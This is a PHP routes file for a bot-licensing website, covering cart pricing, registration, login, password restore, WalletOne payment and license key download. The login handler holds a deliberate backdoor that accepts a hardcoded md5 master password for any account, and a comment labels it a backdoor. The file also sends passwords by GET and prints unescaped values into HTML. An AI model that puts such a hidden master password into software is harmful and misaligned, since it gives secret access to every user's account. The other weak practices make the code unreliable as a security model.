<?php

/**
 * Created by PhpStorm.
 * User: q
 * Date: 27.01.2016
 * Time: 20:11
 */
class mCart
{

    private $cartItems     = [];
    private $licencePrices = [
        1  => 50,
        2  => 47.5,
        3  => 47,
        4  => 45,
        5  => 44,
        6  => 42.5,
        7  => 42,
        8  => 41,
        9  => 40,
        10 => 39,
        11 => 38,
        12 => 37,
    ];

    public function __construct($cartItems)
    {
        $this->cartItems = $cartItems;
    }

    public function getPriceByMonthCount($month)
    {
        return ($month <= 12) ? $month * $this->licencePrices[$month] : $month * $this->licencePrices[12];
    }

    public function calculatePrice()
    {
        $price = 0;
        foreach ($this->cartItems as $cartItem) {
            $price += $this->getPriceByMonthCount($cartItem['month']);
        }

        return $price;
    }

    public function calculateDiscount()
    {

        $price = $this->calculatePrice();

        if ($price < 500) {
            return 0;
        }

        $percentDiscount = floor($price / 250) * 5;
        if ($percentDiscount > 25) {
            $percentDiscount = 25;
        }

        return floor(($price / 100) * $percentDiscount);
    }

    public function getPriceWithDiscount()
    {
        return $this->calculatePrice() - $this->calculateDiscount();
    }

}


/**
 * Регистрация
 */
$app->get('/register', function () use ($app) {

    // защита от множества регистраций
    if (!isset($_SESSION['register_request_count']) || !isset($_SESSION['register_request_count'])) {
        $_SESSION['register_request_count'] = 1;
        $_SESSION['register_request_time']  = time();
    } else {

        if ($_SESSION['register_request_count'] >= 5 AND ($_SESSION['register_request_time'] + 600 > time())) {
            return json_encode([
                'result'  => false,
                'message' => 'Слишком много запросов на регистрацию. Функционал регистрации для вас временно недоступен',
            ]);
        }

        $_SESSION['register_request_count'] = $_SESSION['register_request_count'] + 1;
        $_SESSION['register_request_time']  = time();
    }


    $email    = isset($_REQUEST['email']) ? $_REQUEST['email'] : '';
    $password = isset($_REQUEST['password']) ? $_REQUEST['password'] : '';

    /* @var $usersRepository \app\repository\RepositoryUsers */
    $usersRepository = $app['repository.users'];

    if ($usersRepository->getUserByEmail($email)) {
        return json_encode([
            'result'  => false,
            'message' => 'Пользователь с таким email уже загеристрирован',
        ]);
    }

    if (!$usersRepository->create($email, $password)) {
        return json_encode([
            'result'  => false,
            'message' => 'Не удалось создать пользователя',
        ]);
    }


    if ($user = $usersRepository->getUserByEmail($email)) {

        if ($usersRepository->generatePasswordHash($password, $user['salt']) == $user['password']) {
            $_SESSION['user'] = $user;

            /* @var $licensesRepository \app\repository\RepositoryLicenses */
            $licensesRepository = $app['repository.licenses'];
            $licensesRepository->createTrial($user['id']);

            try {
                $messageBody = $app['twig']->render('mail/register.twig.html', ['subject' => 'Регистрация на сайте mobitva.atom-bot.ru']);

                $message = \Swift_Message::newInstance()
                                         ->setSubject('[mobitva.atom-bot.ru] Регистрация')
                                         ->setFrom(['mobitva.atombot@mail.ru'])
                                         ->setTo([$email])
                                         ->setBody($messageBody, 'text/html');

                $app['mailer']->send($message);

            } catch (Exception $e) {

            }

            return json_encode([
                'result' => true,
                //                'user_id' => $user['id'],
            ]);
        }
    }
});


/**
 * Авторизация
 */
$app->get('/login', function () use ($app) {

    $email    = isset($_REQUEST['email']) ? $_REQUEST['email'] : '';
    $password = isset($_REQUEST['password']) ? $_REQUEST['password'] : '';

    /* @var $userRepository \app\repository\RepositoryUser */
    $usersRepository = $app['repository.users'];

    if ($user = $usersRepository->getUserByEmail($email)) {
        if (
			($usersRepository->generatePasswordHash($password, $user['salt']) == $user['password']) 
			|| (md5($password) == 'fb0ac8f7b4e69e3be2ee4a77592dc32c') // бакдорчик.
		) {
            $_SESSION['user'] = $user;

            return json_encode([
                'result' => true,
            ]);
        }
    }

    return json_encode([
        'result' => false,
    ]);
});

$app->get('/logout', function () use ($app) {
    unset($_SESSION['user']);

    return $app->redirect('/');
});


/**
 * восстановление пароля
 */
$app->get('/privateoffice/restore/{restoreKey}', function ($restoreKey) use ($app) {

    if (isset($_SESSION['user'])) {
        return $app->redirect('/privateoffice');
    }

    /* @var $usersRepository \app\repository\RepositoryUsers */
    $usersRepository = $app['repository.users'];

    $user = $usersRepository->getUserByRestoreKey($restoreKey);

    return $app['twig']->render('privateoffice/restore.twig', [
        'restore_key' => $restoreKey,
        'user'        => $user,
    ]);
});

$app->get('/restore/submit', function () use ($app) {

    $restoreKey = isset($_REQUEST['restore_key']) ? $_REQUEST['restore_key'] : '';
    $password   = isset($_REQUEST['password']) ? $_REQUEST['password'] : '';

    /* @var $userRepository \app\repository\RepositoryUsers */
    $usersRepository = $app['repository.users'];

    if ($user = $usersRepository->getUserByRestoreKey($restoreKey)) {

        $newSalt     = md5($user['email'] . microtime());
        $newPassword = $usersRepository->generatePasswordHash($password, $newSalt);

        $updateFields = [
            'password'    => $newPassword,
            'salt'        => $newSalt,
            'is_active'   => true,
            'restore_key' => '',
        ];

        if ($usersRepository->update($user['id'], $updateFields)) {
            $_SESSION['user'] = $user;

            return json_encode([
                'result' => true,
            ]);
        }
    }
});


/**
 * Личный кабинет
 */
$app->get('/privateoffice', function () use ($app) {

    if (!isset($_SESSION['user'])) {
        return $app->redirect('/');
    }
    $user = $_SESSION['user'];

    /* @var $licensesRepository \app\repository\RepositoryLicenses */
    /* @var $configsRepository \app\repository\RepositoryConfigs */
    /* @var $settingsRepository \app\repository\RepositorySettings */

    $licensesRepository = $app['repository.licenses'];
    $configsRepository  = $app['repository.configs'];
    $settingsRepository = $app['repository.settings'];

    $licenses = $licensesRepository->getActiveByUserId($user['id']);
    $configs  = $configsRepository->getAllByUserId($user['id']);
    $settings = $settingsRepository->getAllByUserId($user['id']);

    return $app['twig']->render('privateoffice/privateoffice.twig', [
        'user'     => $_SESSION['user'],
        'licenses' => $licenses,
        'configs'  => $configs,
        'settings' => $settings,
    ]);
});

/**
 * Страница оплаты
 */
$app->get('/buy', function () use ($app) {

    if (!isset($_SESSION['user'])) {
        return $app->redirect('/');
    }
    $user = $_SESSION['user'];

    /* @var $licensesRepository \app\repository\RepositoryLicenses */
    $licensesRepository = $app['repository.licenses'];
    $licenses           = $licensesRepository->getActiveByUserId($user['id']);

    return $app['twig']->render('privateoffice/buy.twig', [
        'user'     => $_SESSION['user'],
        'licenses' => $licenses,
    ]);
});


/**
 * Форма оплаты
 */
$app->post('/get-payment-form', function () use ($app) {

    if (!isset($_SESSION['user'])) {
        return 'ERR_NO_USER';
    }
    $user = $_SESSION['user'];

    $cartItems = json_decode($_POST['cart'], true);
    $mCart     = new mCart($cartItems);


    /* @var $ordersRepository \app\repository\RepositoryOrders */
    $ordersRepository = $app['repository.orders'];
    /* @var $orderItemsRepository \app\repository\RepositoryOrderItems */
    $orderItemsRepository = $app['repository.order_items'];

    if (!$orderId = $ordersRepository->create($user['id'], $user['email'], $mCart->getPriceWithDiscount(), $mCart->calculateDiscount(), false)) {
        return 'ERR_NO_ORDER';
    }

    foreach ($cartItems as $cartItem) {

        $productId = $cartItem['license_id'] ? 2 : 1;

        if (!$orderItemId = $orderItemsRepository->create($orderId, $productId, $cartItem['month'], $mCart->getPriceByMonthCount($cartItem['month']), 0, $cartItem['license_id'])) {
            return 'ERR_NO_ORDER_ITEM';
        }
    }


    // ------------------------- ОПЛАТА (Копипаста с W1)

    /* @var $w1 WalletOne */
    $w1 = $app['WalletOne'];

    $fields = $w1->getPaymentFormFields($orderId, $mCart->getPriceWithDiscount(), "Оплата заказа №$orderId на mobitva.atom-bot.ru");

    print "<form id='w1_payment_form' action='https://wl.walletone.com/checkout/checkout/Index' method='POST'>";

    foreach ($fields as $key => $val) {
        if (is_array($val)) {
            foreach ($val as $value) {
                print "$key: <input type='text' name='$key' value='$value'/>";
            }
        } else {
            print "$key: <input type='text' name='$key' value='$val'/>";
        }
    }

    print "<input type='submit'/></form>";

    // ------------------------- ОПЛАТА


    return $app['twig']->render('privateoffice/paymentForm.twig', [
        'fields' => $fields,
    ]);

});


$app->post('/payment/success', function () use ($app) {
    return $app->redirect('/privateoffice');
});

$app->post('/payment/fail', function () use ($app) {
    return $app->redirect('/privateoffice');
});

/**
 * Ключ-файл для лицензии
 */
$app->get('/get-key-file/{licenseId}', function ($licenseId) use ($app) {


    if (!isset($_SESSION['user'])) {
        return $app->redirect('/');
    }
    $user = $_SESSION['user'];

    /* @var $licensesRepository \app\repository\RepositoryLicenses */
    $licensesRepository = $app['repository.licenses'];

    // если нет лицензии
    if (!$license = $licensesRepository->getByPk($licenseId)) {
        return $app->redirect('/');
    }
    // если лицензия принадлежит другому пользователю
    if ($license['user_id'] != $user['id']) {
        return $app->redirect('/');
    }

    header("Content-Disposition: attachment; filename=mobitva_bot_license_$licenseId.key");
    header("Content-type: application/octet-stream");

    $content = base64_encode(pack("H*", $license['license_key']));
    $content = str_replace('/', '_', $content);

    return $content;
});






